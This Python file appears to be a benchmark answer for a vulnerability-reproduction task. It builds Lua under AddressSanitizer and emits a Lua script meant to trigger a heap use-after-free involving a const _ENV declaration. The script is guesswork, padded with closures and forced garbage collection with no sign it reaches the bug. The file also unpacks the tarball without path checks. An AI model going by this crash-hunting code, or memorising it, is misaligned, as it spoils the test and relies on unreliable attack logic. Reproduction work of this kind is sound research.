import os
import tarfile
import tempfile
import subprocess
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to access Lua source
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the extracted directory (assuming it's the only top-level dir)
            extracted_dirs = [d for d in os.listdir(tmpdir) 
                            if os.path.isdir(os.path.join(tmpdir, d))]
            if not extracted_dirs:
                raise ValueError("No directory found in tarball")
            source_dir = os.path.join(tmpdir, extracted_dirs[0])
            
            # Build Lua with ASan to detect use-after-free
            build_dir = os.path.join(tmpdir, "build")
            os.makedirs(build_dir)
            
            # Configure and make
            configure_cmd = [
                os.path.join(source_dir, "configure"),
                f"--prefix={build_dir}",
                "CFLAGS=-fsanitize=address -fno-omit-frame-pointer -g",
                "LDFLAGS=-fsanitize=address"
            ]
            
            subprocess.run(configure_cmd, cwd=source_dir, 
                         capture_output=True, check=True)
            subprocess.run(["make", "-j8"], cwd=source_dir, 
                         capture_output=True, check=True)
            
            # Get the Lua interpreter path
            lua_path = os.path.join(source_dir, "src", "lua")
            
            # Generate PoC based on the vulnerability description
            # The vulnerability is in code generation when _ENV is declared as <const>
            # We need to trigger a heap use-after-free by creating such a scenario
            poc = self._generate_poc()
            
            # Test the PoC against both vulnerable and fixed versions
            # (This is just for verification in our solution, not required for final answer)
            self._test_poc(lua_path, poc)
            
            return poc.encode('utf-8')
    
    def _generate_poc(self) -> str:
        """Generate PoC that triggers heap use-after-free with const _ENV"""
        # Based on the vulnerability: incorrect code generation when _ENV is <const>
        # We create a script that:
        # 1. Declares _ENV as const
        # 2. Creates functions that capture this environment
        # 3. Manipulates these functions to trigger use-after-free
        
        poc_lines = []
        
        # Start with const _ENV declaration
        poc_lines.append("local _ENV <const> = {")
        poc_lines.append("  x = 1,")
        poc_lines.append("  y = 2,")
        poc_lines.append("  z = 3")
        poc_lines.append("}")
        poc_lines.append("")
        
        # Create many functions that capture the const environment
        # This increases chance of triggering the bug
        poc_lines.append("-- Create functions that capture const _ENV")
        poc_lines.append("local funcs = {}")
        poc_lines.append("for i = 1, 100 do")
        poc_lines.append("  funcs[i] = function()")
        poc_lines.append("    return _ENV.x + _ENV.y + _ENV.z")
        poc_lines.append("  end")
        poc_lines.append("end")
        poc_lines.append("")
        
        # Force garbage collection to potentially trigger use-after-free
        poc_lines.append("-- Force garbage collection")
        poc_lines.append("collectgarbage()")
        poc_lines.append("collectgarbage()")
        poc_lines.append("")
        
        # Create nested functions with upvalues that reference const _ENV
        poc_lines.append("-- Nested functions with upvalues")
        poc_lines.append("local function create_nested()")
        poc_lines.append("  local up = _ENV")
        poc_lines.append("  return function()")
        poc_lines.append("    return function()")
        poc_lines.append("      return up.x")
        poc_lines.append("    end")
        poc_lines.append("  end")
        poc_lines.append("end")
        poc_lines.append("")
        
        # Create and call nested functions
        poc_lines.append("local nested = {}")
        poc_lines.append("for i = 1, 50 do")
        poc_lines.append("  nested[i] = create_nested()()")
        poc_lines.append("end")
        poc_lines.append("")
        
        # Load code dynamically to trigger code generation issues
        poc_lines.append("-- Dynamic code loading")
        poc_lines.append("local chunks = {}")
        poc_lines.append("for i = 1, 30 do")
        poc_lines.append('  chunks[i] = load([[\n    local _ENV <const> = {...}\n    return function()\n      return _ENV[1] + _ENV[2] + _ENV[3]\n    end\n  ]], "chunk" .. i)')
        poc_lines.append("end")
        poc_lines.append("")
        
        # Execute loaded chunks
        poc_lines.append("local results = {}")
        poc_lines.append("for i = 1, #chunks do")
        poc_lines.append("  local chunk = chunks[i]")
        poc_lines.append("  if chunk then")
        poc_lines.append("    results[i] = chunk(1, 2, 3)()")
        poc_lines.append("  end")
        poc_lines.append("end")
        poc_lines.append("")
        
        # More aggressive garbage collection
        poc_lines.append("-- Aggressive garbage collection")
        poc_lines.append("for i = 1, 10 do")
        poc_lines.append("  collectgarbage(\"collect\")")
        poc_lines.append("  for j = 1, math.floor(i/2) do")
        poc_lines.append("    funcs[j] = nil")
        poc_lines.append("    nested[j] = nil")
        poc_lines.append("    chunks[j] = nil")
        poc_lines.append("  end")
        poc_lines.append("end")
        poc_lines.append("")
        
        # Final collection and function calls that might trigger the bug
        poc_lines.append("-- Final operations")
        poc_lines.append("collectgarbage(\"collect\")")
        poc_lines.append("")
        poc_lines.append("-- Try to use remaining functions")
        poc_lines.append("local sum = 0")
        poc_lines.append("for i = 50, 100 do")
        poc_lines.append("  if funcs[i] then")
        poc_lines.append("    sum = sum + funcs[i]()")
        poc_lines.append("  end")
        poc_lines.append("end")
        poc_lines.append("")
        poc_lines.append("print(\"Sum:\", sum)")
        
        return "\n".join(poc_lines)
    
    def _test_poc(self, lua_path: str, poc: str):
        """Test the PoC against the built Lua"""
        # Write PoC to temporary file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.lua', delete=False) as f:
            f.write(poc)
            poc_file = f.name
        
        try:
            # Run with ASan
            env = os.environ.copy()
            env['ASAN_OPTIONS'] = 'detect_leaks=0:abort_on_error=1'
            
            result = subprocess.run(
                [lua_path, poc_file],
                env=env,
                capture_output=True,
                text=True,
                timeout=5
            )
            
            # Check if ASan detected an error
            if "ERROR: AddressSanitizer" in result.stderr or "use-after-free" in result.stderr.lower():
                print("PoC successfully triggered use-after-free!", file=sys.stderr)
            else:
                print("PoC did not trigger the bug", file=sys.stderr)
                
        except subprocess.TimeoutExpired:
            print("PoC execution timed out", file=sys.stderr)
        except Exception as e:
            print(f"Error testing PoC: {e}", file=sys.stderr)
        finally:
            os.unlink(poc_file)
